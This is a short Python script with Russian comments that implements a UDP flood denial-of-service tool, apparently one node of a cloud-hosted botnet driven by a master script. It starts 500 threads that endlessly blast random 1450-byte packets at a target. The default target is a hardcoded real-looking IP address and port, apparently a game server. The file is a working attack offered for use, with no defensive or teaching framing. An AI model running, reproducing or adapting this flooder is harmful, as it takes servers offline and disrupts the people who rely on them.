import socket
import threading
import random
import os
import sys

# --- CLOUD-SIDE UDP FLOODER (TARGET-AWARE) ---

def attack(ip, port):
    # Создаем сокет для максимального флуда
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Генерируем жирный пакет данных (1450 байт)
    payload = os.urandom(1450)
    
    while True:
        try:
            sock.sendto(payload, (ip, port))
        except:
            # Если канал перегружен, пересоздаем сокет и продолжаем
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            continue

if __name__ == "__main__":
    # Проверяем, передал ли мастер-скрипт цель
    if len(sys.argv) < 3:
        # Если аргументов нет, ставим дефолт (на всякий случай)
        target_ip = "77.110.105.224"
        target_port = 8303
    else:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])

    print(f"--- CLOUD NODE STARTED ---")
    print(f"Targeting: {target_ip}:{target_port}")

    # Запускаем 500 агрессивных потоков
    threads = []
    for i in range(500):
        t = threading.Thread(target=attack, args=(target_ip, target_port))
        t.daemon = True
        t.start()
    
    # Не даем виртуалке выключиться
    while True:
        import time
        time.sleep(10)
